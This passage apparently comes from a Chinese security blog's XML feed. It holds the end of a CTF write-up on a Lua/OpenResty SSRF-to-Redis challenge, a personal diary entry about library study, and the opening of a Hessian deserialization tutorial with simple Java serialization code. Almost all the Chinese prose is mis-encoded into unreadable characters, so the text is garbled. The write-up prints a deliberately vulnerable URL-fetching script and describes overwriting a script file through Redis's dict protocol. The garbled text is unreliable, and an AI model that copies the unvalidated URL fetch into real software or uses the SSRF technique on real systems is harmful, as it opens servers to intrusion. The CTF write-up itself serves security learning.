class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">##LUA_START##</span><br><span class="line"><span class="keyword">local</span> curl = <span class="built_in">require</span>(<span class="string">&quot;cURL&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> redis = <span class="built_in">require</span>(<span class="string">&quot;resty.redis&quot;</span>)</span><br><span class="line"></span><br><span class="line">ngx.req.read_body()</span><br><span class="line"><span class="keyword">local</span> args = ngx.req.get_uri_args()</span><br><span class="line"><span class="keyword">local</span> url = args.url</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> url <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;URL parameter is missing!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> red = redis:new()</span><br><span class="line">red:set_timeout(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = red:connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to connect to Redis: &quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> res, err = red:get(url)</span><br><span class="line"><span class="keyword">if</span> res <span class="keyword">and</span> res ~= ngx.null <span class="keyword">then</span></span><br><span class="line">    ngx.say(res)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> c = curl.easy &#123;</span><br><span class="line">    url = url,</span><br><span class="line">    timeout = <span class="number">5</span>,</span><br><span class="line">    connecttimeout = <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> response_body = &#123;&#125;</span><br><span class="line"></span><br><span class="line">c:setopt_writefunction(<span class="built_in">table</span>.<span class="built_in">insert</span>, response_body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = <span class="built_in">pcall</span>(c.perform, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to perform request: &quot;</span>, err)</span><br><span class="line">    c:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">c:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> response_str = <span class="built_in">table</span>.<span class="built_in">concat</span>(response_body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ok, err = red:setex(url, <span class="number">3600</span>, response_str)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok <span class="keyword">then</span></span><br><span class="line">    ngx.say(<span class="string">&quot;Failed to save response in Redis: &quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">ngx.say(response_str)</span><br><span class="line">##LUA_END##</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡å­¦è¿‡luaæ²¡æ˜ç™½å•¥æ„æ€ä¸¢ä¸ªgpté—®äº†é—®è¿™ä¸ªè„šæœ¬æ˜¯ä»€ä¹ˆæ„æ€å°±æ˜¯ç›¸å½“äºæ˜¯æœ¬åœ°å¼€äº†ä¸€ä¸ªredisæœåŠ¡ï¼Œç„¶åcurlå¯ä»¥å‘èµ·è¯·æ±‚è¿æ¥è¿™ä¸ªredisæœåŠ¡ä¹Ÿå¯ä»¥è®¿é—®httpå°†è¿”å›çš„å€¼å­˜å…¥redisä¸­ã€‚å…¶å®æœ¬è´¨å°±æ˜¯ä¸€ä¸ªssrfæ‰“redisã€‚æˆ‘è¿™é‡Œç›´æ¥ä½¿ç”¨dictåè®®å»æ”»å‡»redisï¼Œæˆ‘çš„æ€è·¯æ˜¯å»è¦†ç›–visit.scriptæ–‡ä»¶ï¼Œå› ä¸ºmain.luaåŠŸèƒ½ä¸»è¦æ˜¯è¯»å–visit.scriptä¸­çš„ä»£ç å»æ‰§è¡Œçš„ã€‚</p><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106122446596.png" class=""><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106122525393.png" class=""><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106122635128.png" class=""><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106122659874.png" class=""><p>è¿™é‡Œçš„16è¿›åˆ¶ä»£ç æ˜¯</p><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106122734510.png" class=""><p>ç„¶åç›´æ¥saveå°±å¯ä»¥äº†</p><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106122819523.png" class=""><p>åœ¨è®¿é—®ä¸‹visitè·¯ç”±å°±å¯ä»¥çœ‹åˆ°flagäº†</p><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106122809730.png" class=""><p>å½“æ—¶æ¯”èµ›æ²¡æ‰“å‡ºæ¥åŸå› æ˜¯è‡ªå·±å’Œé˜Ÿå‹ä¸€ç›´æƒ³ç€å»è¦†ç›–æ‰§è¡Œå‘½ä»¤å»äº†å¿˜äº†ä½¿ç”¨è¿™é‡Œçš„readflagï¼Œä½†æ˜¯æ‰§è¡Œå‘½ä»¤çš„ä»£ç æœ‰ç‚¹é•¿åœ¨redisä¼ è¾“è¿‡ç¨‹ä¸­ä¼šæœ‰ä¸€äº›è„æ•°æ®æ’å…¥åˆ°é‡Œé¢æ‰€ä»¥å¯¼è‡´ä¸€ç›´è¦†ç›–çš„ä»£ç æ˜¯æœ‰é—®é¢˜çš„ã€‚</p><p><a href="9c546db896fcd97d4c84f7fcf99357a3attachment_20250102085620033.zip">é¢˜ç›®é™„ä»¶</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›¾ä¹¦é¦†å­¦ä¹ æ—¥è®°</title>
      <link href="/2025/01/03/%E9%97%B2%E8%B0%88/%E5%9B%BE%E4%B9%A6%E9%A6%86%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
      <url>/2025/01/03/%E9%97%B2%E8%B0%88/%E5%9B%BE%E4%B9%A6%E9%A6%86%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸ªå›¾ä¹¦é¦†æ—¥è®°å‘¢ï¼Œè¿™ä¸ªè¯´æ¥è¯é•¿ï¼Œå…¶å®ä¹Ÿæ˜¯å› ä¸ºè‡ªå·±èœæ‡’ä¸æƒ³åŠ¨ã€‚å…¶å®æœ€ç»ˆè¿˜æ˜¯å› ä¸ºé‚£å¥è¯ â€œæ—¢æ€•å…„å¼Ÿè¿‡çš„è‹¦ï¼Œåˆæ€•å…„å¼Ÿå¼€è·¯è™â€ã€‚è¿™ä¸æˆ‘ä»¬å®¿èˆæˆ‘ä»¬ç§°å…¶ä¸ºâ€gayğŸ¥·â€œï¼Œç”±äºæ˜¯æœŸæœ«å‘¨ï¼Œå…¶å®å»å¤ä¹ ä¹Ÿæ­£å¸¸ï¼Œä½†æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆæˆ‘è¦å†™å†™è¿™ä½å‘¢ï¼Œé‚£å°±æ˜¯å½“åˆæˆ‘ä»¬ä¸€èµ·åƒé¥­çš„æ—¶å€™ä»–è¯´ï¼šâ€œèººå°±å®Œäº†ï¼Œæˆ‘åˆä¸æ‹¿é‚£å¥–å­¦é‡‘ï¼Œå­¦å•¥ï¼Ÿå­¦ä¸ªğŸ¥šâ€ã€‚çˆ·ä»¬ä¿¡äº†ï¼Œä»Šå¤©å‘ç°çˆ·ä»¬å’Œ209æœ€ç‰›é€¼çš„ç”·äººè¢«éª—äº†ï¼Œè¿™ä½ğŸ¥·æ¯å¤©æ—©æ—©çš„èƒŒç€ä¹¦åŒ…å°±å‡ºé—¨äº†ï¼Œåˆ°æ™šä¸Š22:00æ‰å›æ¥ï¼Œä¸è¡Œçˆ·ä»¬è¿™æ¸¸æˆæ‰“çš„éš¾å—å‘ï¼Œäºæ˜¯å«ä¸Š209çš„pwnğŸ‘´ä¸€èµ·å»å›¾ä¹¦é¦†å­¦ä¹ ï¼Œçœ‹ç€æ˜¯åˆ°é‚£äº†ï¼Œè¿™çŸ¥è¯†ä»–ä¸è¿›ğŸ§ å•Šï¼Œäºæ˜¯çˆ·ä»¬å°±ç¡¬èƒŒï¼ŒèƒŒå®Œè‹±è¯­ï¼ŒèƒŒæ”¿æ²»ï¼Œæœ€åèƒŒçš„å¤´æ˜è„‘èƒ€çš„ï¼Œå¤´ç–¼éš¾å—ï¼Œçˆ·ä»¬è·Ÿâ€œ209æœ€ç‰›é€¼çš„ç”·äººâ€å’ŒpwnğŸ‘´è¯´èµ°å§åƒé¥­å»ï¼Œé‚å°±å›æ¥äº†ã€‚</p><img src="/2025/01/03/%E9%97%B2%E8%B0%88/%E5%9B%BE%E4%B9%A6%E9%A6%86%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/IMAGE20250103191427378.png" class=""><p>ä»¥å›¾ä¸ºè¯çˆ·ä»¬ç¡®å®å»å›¾ä¹¦é¦†äº†ï¼Œä¸è¿‡å¥½åƒä¹Ÿåªæ˜¯å»äº†ã€‚æœ€ååœ¨å–·ä¸€å¥è¿™æœŸæœ«è€ƒè¯•ï¼Œè¦å‘½å‘ï¼ï¼ï¼</p><p>è¡¥å……ï¼šåœ¨ğŸ¥·çœ‹åˆ°è¿™ç¯‡æ–‡ç« ä¹‹åå›å¤äº†ä¸€ä¸ªâ€œ6â€å­—</p><img src="/2025/01/03/%E9%97%B2%E8%B0%88/%E5%9B%BE%E4%B9%A6%E9%A6%86%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/IMAGE20250104154852579.png" class=""><p>å…·ä½“åŸå› ä¹Ÿæ²¡è¯´ä»€ä¹ˆï¼Œäºæ˜¯ä¹209æœ€ç‰›é€¼çš„ç”·äººé—®ä»–æ‰å¾—å‡ºä»–ä¸ºä»€ä¹ˆå›æ¥è¿™ä¹ˆæ™šï¼ŒåŸæ¥æ˜¯ä»–è¦åšè®ºæ–‡å®éªŒï¼Œæ—¶é—´ç´§æ€¥ï¼Œçœ‹æ¥æ˜¯æˆ‘ä»¬è¯¯ä¼šè¿™ä½ğŸ¥·äº†ï¼Œåœ¨æ­¤è·Ÿä»–è¯´ä¸€å¥ï¼šâ€œä½ æ€ä¹ˆä¸æ—©è¯´ï¼Œå½“åˆåœ¨ç¾¤é‡Œé—®ä½ å’Œæˆ‘ä»¬ææŠ½è±¡â€ï¼Œåˆ°æ­¤ä¸ºæ­¢ï¼Œå›¾ä¹¦é¦†çš„å­¦ä¹ æ—¥è®°å°±åˆ°æ­¤ä¸ºæ­¢å§ï¼Œå› ä¸ºæˆ‘ä»¬è¦å»æ‰“æ¸¸æˆå»äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—²è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é—²èŠ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessianååºåˆ—åŒ–</title>
      <link href="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Hessian æ˜¯Â <a href="https://caucho.com/">caucho</a>Â å…¬å¸çš„å·¥ç¨‹é¡¹ç›®ï¼Œä¸ºäº†è¾¾åˆ°æˆ–è¶…è¿‡ ORMI&#x2F;Java JNI ç­‰å…¶ä»–è·¨è¯­è¨€&#x2F;å¹³å°è°ƒç”¨çš„èƒ½åŠ›è®¾è®¡è€Œå‡ºï¼Œåœ¨ 2004 ç‚¹å‘å¸ƒ 1.0 è§„èŒƒï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º Hessian ï¼Œå¹¶é€æ­¥è¿­ä»£ï¼Œåœ¨ Hassian jar 3.2.0 ä¹‹åï¼Œé‡‡ç”¨äº†æ–°çš„ 2.0 ç‰ˆæœ¬çš„åè®®ï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º Hessian 2.0ã€‚</p><p>è¿™æ˜¯ä¸€ç§åŠ¨æ€ç±»å‹çš„<a href="http://hessian.caucho.com/doc/hessian-serialization.html">äºŒè¿›åˆ¶åºåˆ—åŒ–</a>å’ŒÂ <a href="http://hessian.caucho.com/doc/hessian-ws.html">Web æœåŠ¡</a>åè®®ï¼Œä¸“ä¸ºé¢å‘å¯¹è±¡çš„ä¼ è¾“è€Œè®¾è®¡ã€‚Hessian åè®®åœ¨è®¾è®¡æ—¶ï¼Œé‡ç‚¹çš„å‡ ä¸ªç›®æ ‡åŒ…æ‹¬äº†ï¼šå¿…é¡»å°½å¯èƒ½çš„å¿«ã€å¿…é¡»å°½å¯èƒ½ç´§å‡‘ã€è·¨è¯­è¨€ã€ä¸éœ€è¦å¤–éƒ¨æ¨¡å¼æˆ–æ¥å£å®šä¹‰ç­‰ç­‰ã€‚</p><p>å¯¹äºè¿™æ ·çš„è®¾è®¡ï¼Œcaucho å…¬å¸å…¶å®æä¾›äº†ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€ä¸ªæ˜¯ Hessionï¼Œä¸€ä¸ªæ˜¯ Burlapã€‚Hession æ˜¯åŸºäºäºŒè¿›åˆ¶çš„å®ç°ï¼Œä¼ è¾“æ•°æ®æ›´å°æ›´å¿«ï¼Œè€Œ Burlap çš„æ¶ˆæ¯æ˜¯ XML çš„ï¼Œæœ‰æ›´å¥½çš„å¯è¯»æ€§ã€‚ä¸¤ç§æ•°æ®éƒ½æ˜¯åŸºäº HTTP åè®®ä¼ è¾“ã€‚</p><p>Hessian æœ¬èº«ä½œä¸ºÂ <a href="https://caucho.com/products/resin">Resin</a>Â çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å®ƒçš„Â <code>com.caucho.hessian.client</code>Â å’ŒÂ <code>com.caucho.hessian.server</code>Â åŒ…ä¸ä¾èµ–äºä»»ä½•å…¶ä»–çš„ Resin ç±»ï¼Œå› æ­¤å®ƒä¹Ÿå¯ä»¥ä½¿ç”¨ä»»ä½•å®¹å™¨å¦‚ Tomcat ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨ EJB ä¸­ã€‚äº‹å®ä¸Šå¾ˆå¤šé€šè®¯æ¡†æ¶éƒ½ä½¿ç”¨æˆ–æ”¯æŒäº†è¿™ä¸ªè§„èŒƒæ¥åºåˆ—åŒ–åŠååºåˆ—åŒ–ç±»ã€‚</p><p>ä½œä¸ºä¸€ä¸ªäºŒè¿›åˆ¶çš„åºåˆ—åŒ–åè®®ï¼ŒHessian è‡ªè¡Œå®šä¹‰äº†ä¸€å¥—è‡ªå·±çš„å‚¨å­˜å’Œè¿˜åŸæ•°æ®çš„æœºåˆ¶ã€‚å¯¹ 8 ç§åŸºç¡€æ•°æ®ç±»å‹ã€3 ç§é€’å½’ç±»å‹ã€ref å¼•ç”¨ä»¥åŠ Hessian 2.0 ä¸­çš„å†…éƒ¨å¼•ç”¨æ˜ å°„è¿›è¡Œäº†ç›¸å…³å®šä¹‰ã€‚è¿™æ ·çš„è®¾è®¡ä½¿å¾— Hassian å¯ä»¥è¿›è¡Œè·¨è¯­è¨€è·¨å¹³å°çš„è°ƒç”¨ã€‚</p><p>å¼•ç”¨è‡ªsu18å¸ˆå‚…çš„ä»‹ç»<a href="https://su18.org/post/hessian/#%E4%BA%8C-%E4%BB%8B%E7%BB%8D">https://su18.org/post/hessian/#%E4%BA%8C-%E4%BB%8B%E7%BB%8D</a>  </p><h2 id="RPCåè®®"><a href="#RPCåè®®" class="headerlink" title="RPCåè®®"></a>RPCåè®®</h2><p>RPCå…¨ç§°ä¸ºRemote Procedure Call Protocolï¼ˆè¿œç¨‹è°ƒç”¨åè®®ï¼‰ï¼ŒRPCå’Œä¹‹å‰å­¦çš„RMIååˆ†ç±»ä¼¼ï¼Œéƒ½æ˜¯è¿œç¨‹è°ƒç”¨æœåŠ¡ï¼Œå®ƒä»¬ä¸åŒä¹‹å¤„å°±æ˜¯RPCæ˜¯é€šè¿‡æ ‡å‡†çš„äºŒè¿›åˆ¶æ ¼å¼æ¥å®šä¹‰è¯·æ±‚çš„ä¿¡æ¯ï¼Œè¿™æ ·è·¨å¹³å°å’Œç³»ç»Ÿå°±æ›´åŠ æ–¹ä¾¿<br>RPCåè®®çš„ä¸€æ¬¡è¿œç¨‹é€šä¿¡è¿‡ç¨‹å¦‚ä¸‹</p><ul><li>å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå¹¶æŒ‰ç…§RPCåè®®æ ¼å¼å¡«å……ä¿¡æ¯</li><li>å¡«å……å®Œæ¯•åå°†äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶è½¬åŒ–ä¸ºæµï¼Œé€šè¿‡ä¼ è¾“åè®®è¿›è¡Œä¼ è¾“</li><li>æœåŠ¡ç«¯æ¥æ”¶åˆ°æµåï¼Œå°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§RPCåè®®æ ¼å¼è·å–è¯·æ±‚çš„ä¿¡æ¯å¹¶è¿›è¡Œå¤„ç†</li><li>å¤„ç†å®Œæ¯•åå°†ç»“æœæŒ‰ç…§RPCåè®®æ ¼å¼å†™å…¥äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ä¸­å¹¶è¿”å›<br>å¼•ç”¨è‡ªboogipopå¸ˆå‚…çš„åšå®¢ï¼š<a href="https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#RPC%E5%8D%8F%E8%AE%AE">https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#RPC%E5%8D%8F%E8%AE%AE</a></li></ul><h2 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h2><p>ç¯å¢ƒä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªPersonç±»å¹¶å®ç°åºåˆ—åŒ–æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªHessianåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_stu</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);  </span><br><span class="line">        output.writeObject(o);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> (T) o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        person.setAge(<span class="number">18</span>);  </span><br><span class="line">        person.setName(<span class="string">&quot;Feng&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s = serialize(person);  </span><br><span class="line">        System.out.println((Person) deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163231453.png" class=""><p>å†æ¥å’ŒJavaåŸç”Ÿåºåˆ—åŒ–å¯¹æ¯”ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);  </span><br><span class="line">        oos.writeObject(t);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span>  <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bai);  </span><br><span class="line">        <span class="keyword">return</span> (T) ois.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  